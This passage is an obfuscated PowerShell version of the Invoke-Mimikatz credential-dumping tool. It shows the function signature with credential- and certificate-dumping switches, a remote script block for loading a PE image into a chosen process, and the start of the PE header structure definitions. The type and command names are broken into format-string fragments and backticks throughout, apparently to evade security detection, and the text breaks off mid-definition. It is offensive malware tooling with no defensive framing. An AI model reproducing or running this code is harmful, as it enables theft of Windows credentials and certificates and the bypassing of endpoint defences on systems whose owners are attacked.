  $8BNX    =  [tYpe]( "{2}{4}{0}{3}{6}{9}{5}{10}{11}{7}{8}{1}"-f'E','BUTE','s','M.RuNt','YSt','e','iME.inTerOp','AsatTR','i','S','rvicEs.Marsha','l'  )  ;   set-iteM ('VARiAb' +  'le:'  +  'irjS' )  ([TYpe]( "{1}{3}{7}{2}{4}{6}{0}{5}"-f 'Nag','SysteM.','rViC','RuNtIme','Es.','EdTYpE','uNmA','.INteropsE'  ) )  ;   $ZPqI7 =[type](  "{0}{1}" -f'inT','32')  ;   sET-iTEM  vARIaBlE:hQMGkU  ( [TYpE]("{0}{1}"-F'BO','ol')   )  ; SEt-itEM  VAriabLe:1x8dw  ([TYpe]("{0}{1}" -F'uiNt','32'  ) )   ;    $vT7bl  = [TYpe]("{3}{0}{1}{2}" -F'I','tcoNveRT','er','B'  )  ; $pg8e1   =[TyPE]("{4}{7}{8}{1}{6}{5}{3}{2}{0}" -F 'Ccess','N.emIt','iLdErA','bu','SYsTEM.ReFLeCt','SSEMblY','.a','I','O')  ;   SET-ITem  vaRIablE:6rLCn ( [TypE](  "{2}{0}{6}{1}{3}{4}{5}"-f'.rEFlec','IOn.','sYsTEm','CALL','IngcO','nVeNTIOnS','T')  )  ;      $3Ar8 =  [TYpe](  "{0}{2}{1}"-f'a','iN','PpDoma'  )   ;    $1Z6 =  [Type](  "{1}{3}{0}{2}"-f'irO','en','NMent','v'  )  ;seT-iTem vArIaBle:078M  (    [tyPE]( "{2}{0}{1}" -F'tpt','r','uin')   );  Set-Item vaRIabLe:rVFo  (  [tyPE](  "{1}{0}" -F'h','MAT' )   ) ;  seT-iTeM  VArIaBlE:OKVP ([tYpE]( "{2}{0}{3}{1}" -f 'YS','InTPtr','s','TEM.' )  );   Set-vaRiAbLE (  "BFu"+"W1") (   [TYPE]("{0}{1}"-f'Con','vert')  )  ;  seT  al9j (  [typE]("{7}{9}{4}{2}{0}{8}{10}{6}{5}{1}{3}"-f 'nte','.MaRSh','Ime.I','AL','nt','S','RVICe','sys','rOps','TEm.RU','E' ) ) ;   $wjag7   = [tYPe]( "{0}{2}{1}" -F 'I','Ptr','Nt') ;   SEt  (  "bt"+  "fp" )  (   [TYpE](  "{2}{1}{0}{3}"-F 'To','Ec','sYSteM.IO.DIr','RY' ) );     Set-itEM ( 'VAriABl'  + 'e:Z'+'6'  + '8'  +  '3') (    [TYPE]("{2}{3}{1}{0}{4}"-F 't.dN','nE','SYS','TEm.','S'  )  ) ;  function in`VokE-m`I`MIk`Atz

{
[CmdletBinding(  DeFaULtpaRAMEtErseTnAmE  ="dCreds")]
Param( 
    [Parameter(  pOSITIon =   0  )]
    [String[]]
    ${C`o`M`put`eRnAME},

    [Parameter(  ParametErseTNAmE  = "dCreds", PosItion   =  1)]
    [Switch]
    ${duMPc`R`EDS},

    [Parameter(parAmetErSETNamE  =  "dCerts", POSITioN  =   1 )]
    [Switch]
    ${duMp`C`ERTS},

    [Parameter(  ParamEterSEtNaME =   "CustomCommand", poSiTIon  = 1 )]
    [String]
    ${coM`mA`Nd}
)

&  ( "{2}{0}{3}{1}"-f'tM','de','Set-Stric','o') -Version 2


${RE`moT`ESC`R`Iptb`LocK}   =   {
    [CmdletBinding(   )]
    Param(  
        [Parameter(  pOSiTioN = 0, MAnDATory   = ${T`RuE} )]
        [String]
        ${pe`ByteS`64},

        [Parameter(POSiTion  =  1, manDAToRY   =  ${T`RuE}  )]
        [String]
        ${P`e`BYt`es32},

        [Parameter(POSItIoN  =   2, MandAtORy  =  ${f`Alse} )]
        [String]
        ${FuNCRe`TU`Rnt`YPe},

        [Parameter(  posITion =   3, MAndaTORy  = ${FAl`se}  )]
        [Int32]
        ${p`Roc`ID},

        [Parameter( POsItiOn  =   4, maNdatoRy   = ${fAl`Se} )]
        [String]
        ${P`ROc`Name},

        [Parameter(PoSiTiON =  5, MaNDAtory  =  ${fA`LsE})]
        [String]
        ${EX`eA`RGS}
    )

   
   
   
    Function GEt-wI`N`32types
    {
        ${W`iN32TYp`Es}   =    & (  "{2}{1}{0}"-f'ct','e','New-Obj' ) ("{2}{1}{0}" -f 'Object','em.','Syst'  )

       
       
        ${dom`A`In}   =     (  gEt-vAriaBle 3aR8  -VaLUE  )::"Curr`E`NtDOMa`In"
        ${Dy`N`AMicA`ssE`mblY}   =   &( "{1}{0}{2}" -f '-Ob','New','ject' ) ("{7}{6}{0}{2}{4}{5}{8}{1}{3}" -f 'Refle','N','ct','ame','ion','.','ystem.','S','Assembly')( 'DynamicAssembly')
        ${A`Ss`em`BLYBUiL`dEr}   =  ${D`OMA`iN}."de`FIN`e`DyNamI`Ca`ssEMbLy"(  ${dYnami`c`AsSeM`B`LY},  $PG8E1::"R`Un"  )
        ${MOd`Ul`ebUil`D`eR}  =  ${aS`S`EMBLyB`UIlD`eR}.(  "{2}{0}{4}{3}{5}{1}" -f'efineDyn','e','D','mic','a','Modul').Invoke( 'DynamicModule', ${FAL`se} )
        ${cO`NStrUc`T`OR`InFo} =  (   GET-VAriaBle  8BnX  -vALUeO  ).( "{3}{0}{2}{1}"-f 'etCons','uctors','tr','G' ).Invoke(  )[0]


       
       
        ${t`Yp`EBUilder} =   ${MODuleb`Ui`l`dEr}."D`e`FinEENum"(  'MachineType', 'Public', [UInt16]  )
        ${TYPEbuI`LD`ER}."DEfiNE`liT`eRAL"(  'Native', [UInt16] 0 )   |     & ( "{0}{1}{2}" -f 'Out','-','Null')
        ${TYP`EBu`ilDeR}."DEfin`Eli`Te`RaL"('I386', [UInt16] 0x014c ) |  &(  "{0}{1}{2}"-f'O','u','t-Null'  )
        ${Ty`peb`UI`lDEr}."D`E`FInE`lIteral"('Itanium', [UInt16] 0x0200 )   |    & ( "{1}{2}{0}" -f'll','O','ut-Nu')
        ${T`ypeb`UIl`dER}."D`ef`InELit`ER`Al"( 'x64', [UInt16] 0x8664  ) |   &  ( "{1}{2}{0}"-f 'll','Out-N','u' )
        ${ma`chI`NETY`pE}   =   ${t`YpeBui`ld`er}.("{2}{0}{1}" -f'e','Type','Creat'  ).Invoke()
        ${w`I`N3`2tyPes} | & (  "{0}{1}{2}"-f 'Add','-Membe','r' ) -MemberType ( "{2}{1}{0}"-f 'erty','oteProp','N'  ) -Name (  "{1}{3}{2}{0}" -f 'e','M','eTyp','achin' ) -Value ${MaCHiNe`T`YPe}

       
        ${ty`p`e`BuIldEr}  =   ${mO`d`ULE`BUi`ldeR}."de`FiNEe`NUm"(  'MagicType', 'Public', [UInt16] )
        ${T`ypeBui`L`DER}."dEfi`N`EliTeRal"( 'IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) |    &(  "{0}{1}{2}"-f 'Ou','t-N','ull' )
        ${t`Yp`ebUi`lDer}."deFInE`LiTe`R`AL"( 'IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b  )   |     &  ("{0}{1}{2}"-f 'Ou','t-','Null' )
        ${mA`giCtY`pE}  =   ${t`ypE`Bu`ilDer}.(  "{2}{1}{0}" -f 'pe','ateTy','Cre'  ).Invoke(  )
        ${wi`N32Typ`Es} |     &( "{2}{1}{0}"-f 'd-Member','d','A') -MemberType (  "{1}{0}{3}{2}" -f 'Pr','Note','ty','oper' ) -Name (  "{2}{0}{3}{1}" -f 'T','pe','Magic','y'  ) -Value ${mAgi`cTY`pE}

       
        ${t`ypEb`UIL`Der}  = ${Mo`D`UleBUilDEr}."D`efiNeen`UM"('SubSystemType', 'Public', [UInt16]  )
        ${TyP`eBuil`DEr}."De`FI`NelIT`eRaL"('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0  ) | &  ("{1}{2}{0}" -f 'ull','Out','-N'  )
        ${t`yP`EBUilDeR}."DEfINe`liTe`Ral"( 'IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) |  &("{2}{1}{0}" -f 'll','ut-Nu','O' )
        ${tY`peBUI`l`der}."D`eFineLIT`eraL"(  'IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2 )  | & ( "{0}{1}{2}"-f'Ou','t-Nul','l'  )
        ${tYpeb`Ui`ldER}."d`Ef`In`ELITEr`AL"( 'IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3)  |   & ("{2}{0}{1}"-f'N','ull','Out-')
        ${Ty`Peb`UIl`dEr}."DeFi`NEL`ITERaL"( 'IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7  )  | &  ( "{1}{2}{0}"-f 'Null','O','ut-' )
        ${TYpeBuiL`D`ER}."D`EF`ine`LI`TeRAl"('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9  )  | & (  "{2}{1}{0}" -f'l','-Nul','Out')
        ${Ty`pe`BuiLdEr}."DefinEL`iTER`Al"('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10  ) |    &(  "{0}{2}{1}" -f 'Ou','ll','t-Nu'  )
        ${tYpe`Bu`IlD`er}."D`EFi`Ne`lI`TErAl"('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | &("{2}{0}{1}"-f'ut-Nu','ll','O' )
        ${ty`pEBuI`L`DeR}."DEFinELi`Te`R`AL"(  'IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12 ) |   &  ( "{1}{2}{0}"-f 'ull','Out-','N'  )
        ${TY`PEBu`iL`DER}."deF`Ine`litEral"(  'IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13  )   |    &(  "{0}{1}{2}"-f 'Out','-Nul','l'  )
        ${typ`ebuI`L`DEr}."defINe`LITER`Al"( 'IMAGE_SUBSYSTEM_XBOX', [UInt16] 14  ) |    &(  "{2}{1}{0}" -f'l','l','Out-Nu'  )
        ${S`UBsystEM`T`YPE}   = ${TYPe`BuI`lD`er}.(  "{2}{1}{0}" -f'e','Typ','Create'  ).Invoke(  )
        ${w`In32tY`pes}   |     &("{1}{2}{0}"-f'ber','Add-Me','m') -MemberType ( "{1}{0}{2}"-f 'teProper','No','ty'  ) -Name (  "{3}{2}{0}{1}" -f 'stemT','ype','ubSy','S') -Value ${s`UBsySTE`Mt`YPe}

       
        ${TYPe`Buil`DER}   =   ${mO`DUleb`UIl`d`er}."DeFi`Neen`UM"(  'DllCharacteristicsType', 'Public', [UInt16] )
        ${ty`pebui`LDEr}."DEFiNe`lite`R`Al"(  'RES_0', [UInt16] 0x0001 ) |    &( "{0}{1}"-f 'Out-Nu','ll' )
        ${typEb`UiL`d`er}."d`efI`N`ElI`TeraL"( 'RES_1', [UInt16] 0x0002  )   |   &  (  "{2}{0}{1}"-f 'N','ull','Out-' )
        ${TY`p`EBUI`lDeR}."d`EfiNelITE`RAl"( 'RES_2', [UInt16] 0x0004  )   |  &  (  "{0}{1}{2}"-f'O','u','t-Null'  )
        ${TyPe`Bui`Ld`ER}."DE`FIne`LI`TErAl"( 'RES_3', [UInt16] 0x0008 )  |  & ("{1}{0}{2}" -f 'ut','O','-Null')
        ${TYPE`Bu`ILdEr}."DE`Fi`NE`liTE`RaL"(  'IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040  )   |   & (  "{0}{1}{2}"-f 'Out','-Nul','l')
        ${TY`pe`BUIl`DER}."deF`I`NeL`iTeRAl"( 'IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080)   |    &  (  "{2}{1}{0}" -f 'll','ut-Nu','O'  )
        ${ty`p`Ebu`ILder}."D`efinElItE`RAl"( 'IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100 ) |    &  ( "{1}{2}{0}" -f'll','Out-N','u'  )
        ${T`y`P`EBUILDer}."D`e`FinELIT`ERaL"('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200 )  |   & (  "{2}{1}{0}"-f'Null','t-','Ou'  )
        ${T`Yp`ebui`LDEr}."DEfinel`IT`ERAl"( 'IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400  ) |   & ( "{0}{1}{2}"-f'O','ut','-Null')
        ${t`y`P`EbuILDER}."D`efiNeL`ItE`RAl"('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800 )  |   &( "{0}{2}{1}" -f 'Ou','ll','t-Nu'  )
        ${T`yPE`B`UiLDer}."defi`N`E`LiTERal"(  'RES_4', [UInt16] 0x1000  )  |  & ( "{1}{0}"-f '-Null','Out')
        ${t`Y`PebuI`LDer}."DEfine`l`iT`eraL"( 'IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000  )  |    &  (  "{1}{2}{0}" -f'll','O','ut-Nu' )
        ${TYpE`BUiL`dEr}.("{3}{1}{2}{0}" -f'eral','Li','t','Define').Invoke( 'IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) |    & (  "{2}{0}{1}" -f 't-Nu','ll','Ou' )
        ${d`LLcHAra`CT`ERIstIcsT`YPe}  = ${TYpEBUiL`D`ER}.( "{3}{2}{0}{1}"-f'T','ype','e','Creat').Invoke(   )
        ${WIN32tY`p`Es}   |    &( "{2}{0}{1}"-f 'mb','er','Add-Me') -MemberType (  "{3}{2}{0}{1}"-f'pert','y','otePro','N' ) -Name (  "{3}{0}{2}{4}{1}" -f'ter','Type','isti','DllCharac','cs' ) -Value ${Dll`CH`ARacterI`StIcSTyPe}

       
       
        ${At`TrIb`UTES} = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        ${t`YpEb`UiLdER}   = ${M`Od`UlEBU`iLDER}."DE`F`ineTyPE"('IMAGE_DATA_DIRECTORY', ${a`TT`RIbUT`Es}, [System.ValueType], 8 )
        (  ${T`ypeB`U`IlDEr}."defin`e`F`IELd"('VirtualAddress', [UInt32], 'Public' )).(  "{1}{2}{0}"-f'ffset','S','etO'  ).Invoke(  0) |     &  ( "{0}{1}" -f'O','ut-Null')
        (${t`YPeB`UILdER}."dEf`IN`EFieLD"(  'Size', [UInt32], 'Public')  ).("{2}{0}{1}" -f's','et','SetOff' ).Invoke(4  )   |   & ( "{2}{0}{1}" -f'l','l','Out-Nu')
        ${i`M`AGE_dATa_`d`IrE`cTOrY}  = ${tYPeB`U`iLDEr}.(  "{0}{2}{1}"-f 'C','eType','reat'  ).Invoke(    )
        ${wi`N`32TyPEs} |  &  (  "{1}{0}{2}" -f 'mb','Add-Me','er' ) -MemberType ( "{0}{1}{2}" -f'Note','Pro','perty'  ) -Name ("{1}{0}{2}{3}" -f'MAGE_D','I','A','TA_DIRECTORY' ) -Value ${ImAGE_d`Ata`_D`IRect`oRy}

       
        ${AT`TRI`BUtes}  = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        ${tYpE`Bu`IL`der} = ${mODUl`eb`UILd`Er}."DEFINET`Y`pe"( 'IMAGE_FILE_HEADER', ${at`T`RIbUT`eS}, [System.ValueType], 20 )
        ${TyPeb`U`i`ldER}."De`FIneF`i`eld"( 'Machine', [UInt16], 'Public'  )   |   &(  "{1}{0}{2}" -f'u','Out-N','ll' )
        ${typ`EB`UiLd`eR}."d`e`FINEFI`ElD"( 'NumberOfSections', [UInt16], 'Public' )   |  &  ("{0}{1}" -f'Out','-Null' )
        ${tY`Pe`BUIl`DeR}."DEFiN`eF`ie`ld"( 'TimeDateStamp', [UInt32], 'Public')  |  &  ( "{1}{0}{2}"-f 't-Nul','Ou','l'  )
        ${Typebu`IL`d`er}."d`efIn`efi`ElD"( 'PointerToSymbolTable', [UInt32], 'Public'  )  |   & ("{1}{2}{0}" -f 'll','Out-N','u'  )
        ${t`Y`pebUI`ldEr}."DE`FI`NEfielD"(  'NumberOfSymbols', [UInt32], 'Public')  |    &  (  "{1}{0}{2}" -f'Nu','Out-','ll')
        ${tYP`E`B`UIlder}."DE`FinEFi`Eld"( 'SizeOfOptionalHeader', [UInt16], 'Public') |  &("{0}{1}{2}"-f'O','ut-Nu','ll' )
        ${T`YPE`BUIL`deR}."d`EFi`Ne`FIElD"('Characteristics', [UInt16], 'Public' )  |    &(  "{2}{0}{1}" -f't-Nu','ll','Ou')
        ${imaGe_`FILe_`HeAD`ER}   = ${Ty`pebU`i`LdeR}.( "{0}{2}{1}"-f 'Cr','eType','eat'  ).Invoke(   )
        ${w`In32T`yP`es}  |  &  ( "{0}{2}{1}"-f'Ad','Member','d-'  ) -MemberType ( "{1}{2}{0}{3}"-f'Pro','N','ote','perty' ) -Name (  "{4}{1}{3}{2}{0}" -f 'ER','AGE','AD','_FILE_HE','IM') -Value ${IMAg`e_FiL`E`_HeadeR}

       
        ${a`T`TribuTes} = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        ${TYPe`BuI`ldeR} =  ${M`odUL`E`BUILDER}."defi`Ne`Type"( 'IMAGE_OPTIONAL_HEADER64', ${A`TT`RIBUTEs}, [System.ValueType], 240)
        ( ${tYP`Ebui`Ld`Er}.( "{0}{1}{2}"-f'Defin','eFi','eld').Invoke(  'Magic', ${MAgI`c`Ty`PE}, 'Public')).( "{1}{0}" -f'fset','SetOf'  ).Invoke(0 )  |   & ("{2}{0}{1}" -f 'N','ull','Out-')
        ( ${tyP`Ebuil`d`eR}."d`EFIn`E`FiELd"('MajorLinkerVersion', [Byte], 'Public' ) ).(  "{0}{1}{2}" -f'S','etOffse','t'  ).Invoke(  2  )   |   &  ("{0}{1}"-f'Out-Nu','ll' )
        (  ${t`YP`eBui`lDER}."dEF`INEFIe`Ld"( 'MinorLinkerVersion', [Byte], 'Public')).("{0}{1}{2}" -f'S','e','tOffset'  ).Invoke(  3  )  |    &( "{2}{0}{1}"-f 'l','l','Out-Nu'  )
        (  ${tY`PE`B`UiLDEr}."DeFinE`Fi`e`lD"(  'SizeOfCode', [UInt32], 'Public') ).(  "{0}{1}{2}"-f'Se','tOf','fset'  ).Invoke( 4)  |    & (  "{2}{1}{0}" -f'll','t-Nu','Ou'  )
        (${T`YpebU`IL`DEr}."DE`FineFIe`ld"(  'SizeOfInitializedData', [UInt32], 'Public' ) ).(  "{1}{2}{0}" -f 't','SetO','ffse').Invoke( 8  )   |   & ( "{2}{1}{0}"-f'l','Nul','Out-')
        (${TyPe`BuiL`DEr}."DEFINE`F`Ield"('SizeOfUninitializedData', [UInt32], 'Public'  ) ).("{2}{0}{1}"-f 'fse','t','SetOf' ).Invoke(12  )  |    & (  "{2}{1}{0}" -f 'ull','ut-N','O'  )
        (${TYpEbu`ild`eR}."dEfIN`E`FiELd"('AddressOfEntryPoint', [UInt32], 'Public'  ) ).("{0}{3}{2}{1}" -f 'Set','set','ff','O'  ).Invoke( 16 ) | &  (  "{0}{1}{2}" -f 'Ou','t-Nu','ll')
        (${Ty`PEbUIl`deR}."dEfin`Ef`IE`LD"( 'BaseOfCode', [UInt32], 'Public')).(  "{0}{1}{2}" -f'Set','Offs','et').Invoke(20 )  | &(  "{1}{2}{0}" -f 'Null','Out','-')
        (  ${t`ypeb`UI`LDer}."Def`i`NEFI`Eld"( 'ImageBase', [UInt64], 'Public'  )  ).("{0}{2}{1}" -f 'S','set','etOff'  ).Invoke(24) |   &(  "{1}{2}{0}"-f'Null','O','ut-')
        (${t`YpEb`UIlD`Er}."DEFinEF`i`elD"(  'SectionAlignment', [UInt32], 'Public'  )  ).("{2}{1}{0}"-f 'et','Offs','Set').Invoke(  32  )  | &( "{2}{1}{0}" -f 't-Null','u','O'  )
        ( ${T`yPEb`U`iLDER}."D`EFin`EfiElD"( 'FileAlignment', [UInt32], 'Public'  )).("{2}{0}{1}"-f 'etOf','fset','S'  ).Invoke( 36 )   | &( "{1}{0}"-f'-Null','Out')
        ( ${TYpe`B`U`ILDeR}."D`EFINEfIe`Ld"(  'MajorOperatingSystemVersion', [UInt16], 'Public') ).( "{0}{1}"-f'SetOffse','t' ).Invoke( 40  )  |   &  ("{2}{0}{1}"-f 'ut-N','ull','O' )
        (  ${TY`Pe`BuIlder}."DEFInE`FIe`lD"(  'MinorOperatingSystemVersion', [UInt16], 'Public')  ).(  "{1}{3}{0}{2}" -f 'se','SetOf','t','f'  ).Invoke( 42) |    &(  "{0}{1}" -f 'Out-Nul','l'  )
        ( ${t`y`pEBUIlD`er}."D`EfI`NeFi`Eld"(  'MajorImageVersion', [UInt16], 'Public')  ).("{0}{1}{2}"-f 'Se','tOffse','t').Invoke(44)  |    &(  "{2}{1}{0}"-f'l','l','Out-Nu')
        ( ${t`y`pebUi`LDEr}."dEf`Inef`IE`ld"( 'MinorImageVersion', [UInt16], 'Public'  )  ).( "{0}{2}{1}"-f'Set','t','Offse' ).Invoke(46) |  &(  "{1}{0}{2}" -f'u','Out-N','ll' )
        (  ${t`yP`EbUi`LDER}."Def`i`NEf`ieLD"(  'MajorSubsystemVersion', [UInt16], 'Public')).("{1}{2}{0}" -f'et','Set','Offs').Invoke(48  ) |   & ( "{1}{0}"-f'ut-Null','O'  )
        (  ${Typ`EbUiLD`eR}."D`E`F`InefIELd"( 'MinorSubsystemVersion', [UInt16], 'Public')  ).(  "{2}{0}{1}" -f 'tO','ffset','Se' ).Invoke(  50  ) | &  (  "{1}{0}" -f'-Null','Out')
        ( ${tY`pebU`iL`dEr}."DE`FiNE`FIeld"( 'Win32VersionValue', [UInt32], 'Public'  )  ).(  "{2}{1}{0}"-f 'fset','f','SetO' ).Invoke(52) |  &  ("{0}{2}{1}" -f 'Out-N','ll','u' )
        (  ${TY`Pe`Bui`LdEr}."dEfiNE`FI`ElD"(  'SizeOfImage', [UInt32], 'Public'  )  ).("{1}{0}"-f 'ffset','SetO' ).Invoke(  56  )  |    &  ("{1}{0}" -f '-Null','Out'  )
        (${tY`PEbUI`lD`ER}."DeF`iNefIe`lD"( 'SizeOfHeaders', [UInt32], 'Public' )).(  "{2}{1}{0}{3}" -f 'Offs','et','S','et'  ).Invoke( 60)   |   &  ( "{0}{1}" -f 'Out-Nu','ll')
        (${T`y`PEBUilder}."d`EFinE`FIE`ld"(  'CheckSum', [UInt32], 'Public'  ) ).("{0}{1}{2}"-f'S','etOffse','t').Invoke(64)   | &  ("{0}{1}" -f'Out','-Null'  )
        (${tYpe`B`UiL`DeR}.("{1}{3}{0}{2}"-f'fineF','D','ield','e' ).Invoke('Subsystem', ${SubSYst`E`m`T`Ype}, 'Public' )  ).("{0}{2}{1}" -f'SetOffs','t','e' ).Invoke(  68 )  |    & (  "{0}{1}"-f 'Out-Nul','l'  )
        ( ${T`yPe`Bui`lder}.( "{0}{1}{2}{3}"-f'De','f','ineF','ield'  ).Invoke( 'DllCharacteristics', ${dllC`hA`Ra`cTe`RIsTI`C`STYPE}, 'Public'  )  ).(  "{1}{0}{2}" -f'ff','SetO','set').Invoke(  70  )  |  &  ( "{2}{0}{1}"-f'-Nul','l','Out')
        (${T`YPeBUI`Ld`eR}."DEfi`Ne`Fi`eLD"('SizeOfStackReserve', [UInt64], 'Public'  )).("{0}{1}{2}" -f'SetO','ffs','et').Invoke( 72  ) | &(  "{2}{1}{0}" -f '-Null','ut','O' )
        (${TY`PEbUIl`DER}."def`I`NE`FiEld"(  'SizeOfStackCommit', [UInt64], 'Public')).(  "{0}{1}{2}"-f'SetOff','se','t' ).Invoke(  80 ) |     &("{0}{2}{1}" -f'Ou','ull','t-N' )
        (${t`y`pEBUild`er}."DE`Finef`ielD"( 'SizeOfHeapReserve', [UInt64], 'Public' ) ).(  "{2}{1}{0}" -f'ffset','tO','Se' ).Invoke( 88) |     & (  "{0}{1}"-f 'Ou','t-Null'  )
        (${tY`pEBuiL`Der}."dE`FI`NeFiEld"('SizeOfHeapCommit', [UInt64], 'Public') ).( "{0}{1}{2}" -f 'SetO','ff','set').Invoke(96 )  |     &  ("{1}{0}"-f't-Null','Ou'  )
        (${ty`PeBU`iL`Der}."dE`FIN`EFieLD"('LoaderFlags', [UInt32], 'Public')  ).(  "{2}{0}{1}"-f 'etOf','fset','S' ).Invoke(104 )  |   &  ( "{1}{0}"-f 'ut-Null','O')
        ( ${ty`PEBui`lDeR}."defineF`i`eLD"(  'NumberOfRvaAndSizes', [UInt32], 'Public') ).( "{1}{0}{2}"-f'e','SetOffs','t').Invoke(108 ) |     &  ("{2}{1}{0}"-f'll','u','Out-N')
        (  ${tYP`eBui`l`dER}.(  "{1}{0}{2}" -f'efineFie','D','ld' ).Invoke( 'ExportTable', ${i`mAgE`_dATa_Dir`ecto`RY}, 'Public' ) ).("{2}{0}{1}"-f 'f','fset','SetO').Invoke( 112)  |     &  (  "{1}{0}" -f 'ull','Out-N')
        ( ${TypebUi`l`deR}.( "{1}{0}{2}" -f 'efineFie','D','ld'  ).Invoke( 'ImportTable', ${Ima`gE`_`datA_D`I`ReCtoRy}, 'Public')).("{1}{2}{0}"-f't','S','etOffse' ).Invoke( 120  )  |   & ( "{1}{0}" -f'l','Out-Nul'  )
        ( ${t`YpeBUiL`DEr}.(  "{2}{1}{0}" -f 'eField','efin','D').Invoke('ResourceTable', ${I`Ma`ge_`daTa_Dir`ecTO`Ry}, 'Public')).("{2}{1}{0}{3}" -f 'fse','Of','Set','t'  ).Invoke(128)   |     & ( "{1}{0}" -f 't-Null','Ou')
        (  ${TY`pEB`U`ilDeR}.( "{1}{2}{3}{0}"-f'eld','D','efine','Fi'  ).Invoke('ExceptionTable', ${image`_`dAta_dir`ectORy}, 'Public')).(  "{1}{0}{2}"-f'e','S','tOffset'  ).Invoke(  136)  |     &  ( "{1}{0}"-f'ut-Null','O'  )
        ( ${tYP`e`Bu`iLdER}.( "{1}{0}{2}"-f'eF','Defin','ield'  ).Invoke(  'CertificateTable', ${ImAg`E`_Dat`A_DIreC`T`oRy}, 'Public' )  ).( "{1}{0}"-f'Offset','Set'  ).Invoke(  144  )  |  &  ("{0}{1}" -f 'Out-Nul','l' )
        (  ${t`YPEbu`I`Lder}.(  "{2}{0}{1}"-f 'eFi','eld','Defin' ).Invoke(  'BaseRelocationTable', ${I`mAGE`_`DaTa`_DIREc`ToRy}, 'Public'  ) ).(  "{2}{1}{0}"-f't','fse','SetOf').Invoke(  152)  |  &  (  "{1}{2}{0}" -f'Null','O','ut-'  )
        (  ${t`yp`EbU`ildeR}.("{1}{2}{0}"-f'ield','Define','F'  ).Invoke( 'Debug', ${ImAgE_D`ATA_dIrEC`T`O`RY}, 'Public' )).("{0}{1}"-f 'SetOf','fset').Invoke(160  ) |   &(  "{1}{2}{0}" -f 'll','Ou','t-Nu')
        ( ${tyPEB`UI`ld`er}.(  "{1}{0}{2}" -f 'eFiel','Defin','d'  ).Invoke(  'Architecture', ${I`m`Age_d`AtA_DIRE`CtO`Ry}, 'Public' )  ).("{0}{2}{1}"-f'Se','set','tOff' ).Invoke(  168 )   |    &("{0}{1}" -f'O','ut-Null' )
        (  ${TyP`ebU`IL`dER}.( "{2}{0}{1}"-f 'neFi','eld','Defi').Invoke( 'GlobalPtr', ${IMAge_`da`Ta_DIRe`CtO`RY}, 'Public' )).(  "{1}{0}{2}" -f 'ffs','SetO','et'  ).Invoke( 176)  |    & (  "{0}{1}" -f'Out-Nu','ll' )
        (${tyPe`BUI`LD`Er}.("{2}{3}{1}{0}"-f 'ld','eFie','D','efin'  ).Invoke(  'TLSTable', ${I`mAgE_da`TA_`DIrec`To`Ry}, 'Public')  ).("{3}{1}{0}{2}"-f 'se','etOff','t','S'  ).Invoke(184 )  |    &  ("{2}{0}{1}" -f 'u','ll','Out-N' )
        (${T`yPEBU`i`LdER}.("{2}{1}{0}"-f'ield','eF','Defin' ).Invoke( 'LoadConfigTable', ${iMaGE_Dat`A`_`DirE`ctO`RY}, 'Public')).( "{1}{0}{2}"-f'ffse','SetO','t'  ).Invoke(  192  ) |    &  ("{1}{0}{2}"-f't-Nul','Ou','l')
        (  ${TYp`eb`UilD`eR}.( "{1}{0}{3}{2}" -f 'ne','Defi','ld','Fie').Invoke('BoundImport', ${I`Mage_dATa`_dirEct`OrY}, 'Public'  )).("{2}{0}{1}" -f'ffse','t','SetO').Invoke( 200 )   |  &  ("{2}{1}{0}"-f 'ull','-N','Out' )
        (  ${tYpeBu`iL`DER}.( "{2}{0}{1}"-f 'eF','ield','Defin').Invoke( 'IAT', ${iMaG`e_d`ATA_DIR`ecTO`Ry}, 'Public' )  ).(  "{2}{1}{0}" -f'set','tOff','Se').Invoke( 208 ) |     &(  "{1}{0}{2}"-f 'l','Out-Nu','l')
        ( ${TYpEBu`Ild`ER}.( "{1}{2}{0}" -f'ld','De','fineFie' ).Invoke( 'DelayImportDescriptor', ${im`AGe_dAT`A_dir`ec`T`orY}, 'Public'  ) ).( "{1}{0}"-f 'et','SetOffs'  ).Invoke(216  ) |   & ("{1}{2}{0}"-f'll','Out','-Nu'  )
        ( ${t`Yp`Eb`UildEr}.( "{3}{0}{1}{2}" -f'in','eF','ield','Def'  ).Invoke('CLRRuntimeHeader', ${IMaG`e_daTa_D`i`Re`CtO`RY}, 'Public' )).("{0}{2}{1}"-f'S','ffset','etO').Invoke( 224  )  |    & ( "{2}{1}{0}"-f'ull','-N','Out')
        (  ${TyP`eBu`iLder}.("{2}{1}{0}"-f'ld','efineFie','D' ).Invoke( 'Reserved', ${imAg`E`_D`AtA_DIre`cTOrY}, 'Public'  )  ).( "{0}{1}{2}" -f 'SetOff','s','et'  ).Invoke(232) | &("{2}{0}{1}" -f 'ut-N','ull','O')
        ${IMA`GE_`OPT`ioNA`L`_HeAd`Er64}   = ${TYpEb`U`IL`Der}.( "{1}{2}{0}" -f 'eType','C','reat' ).Invoke(    )
